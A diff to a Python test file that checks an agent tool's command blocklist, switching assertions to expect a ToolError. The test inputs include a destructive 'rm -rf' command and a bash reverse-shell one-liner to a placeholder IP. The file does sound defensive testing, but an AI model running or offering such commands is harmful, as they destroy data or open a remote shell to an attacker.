@@ -6,18 +6,21 @@ Verifies that command_exec's defense-in-depth blocklist now uses the shared
 """
 import asyncio
 
+import pytest
+
 from twinkle.agentserver.tools.builtin import command_exec
+from twinkle.agentserver.tools.errors import ToolError
 
 
 def test_dangerous_command_rejected_via_builtin_rules():
-    out = asyncio.run(command_exec.command_exec.invoke({"command": "rm -rf /tmp/x"}))
-    assert "rejected for safety" in out or "ERROR" in out
+    with pytest.raises(ToolError, match="rejected for safety"):
+        asyncio.run(command_exec.command_exec.invoke({"command": "rm -rf /tmp/x"}))
 
 
 def test_jiuwen_reverse_shell_rejected():
-    out = asyncio.run(command_exec.command_exec.invoke(
-        {"command": "bash -i >& /dev/tcp/1.2.3.4/4444"}))
-    assert "rejected" in out or "ERROR" in out
+    with pytest.raises(ToolError, match="rejected for safety"):
+        asyncio.run(command_exec.command_exec.invoke(
+            {"command": "bash -i >& /dev/tcp/1.2.3.4/4444"}))
 
 
 def test_benign_command_runs(monkeypatch, tmp_path):
